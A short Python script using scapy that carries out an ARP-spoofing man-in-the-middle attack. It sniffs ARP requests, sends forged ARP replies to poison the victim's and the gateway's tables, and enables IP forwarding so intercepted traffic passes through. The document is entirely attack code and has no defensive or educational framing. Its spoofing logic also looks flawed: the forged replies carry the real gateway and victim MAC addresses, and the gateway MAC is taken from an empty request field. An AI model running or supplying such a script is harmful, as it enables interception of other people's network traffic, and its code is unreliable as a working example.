import os
import sys
import time
from scapy.all import *

def mitm_attack(pkt):
    if pkt.haslayer(ARP) and pkt[ARP].op == 1:
        victim_mac = pkt[ARP].hwsrc
        victim_ip = pkt[ARP].psrc
        gateway_mac = pkt[ARP].hwdst
        gateway_ip = pkt[ARP].pdst

        # Spoof victim's ARP table
        spoof_pkt = ARP(op=2, hwsrc=gateway_mac, psrc=gateway_ip, hwdst=victim_mac, pdst=victim_ip)
        send(spoof_pkt, verbose=False)

        # Spoof gateway's ARP table
        spoof_pkt = ARP(op=2, hwsrc=victim_mac, psrc=victim_ip, hwdst=gateway_mac, pdst=gateway_ip)
        send(spoof_pkt, verbose=False)

def main():
    # Enable IP forwarding
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    # Set up the MITM attack
    print("Starting the MITM attack...")
    try:
        sniff(filter="arp", prn=mitm_attack, store=0)
    except KeyboardInterrupt:
        print("Stopping the MITM attack...")
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        sys.exit(0)

if __name__ == "__main__":
    main()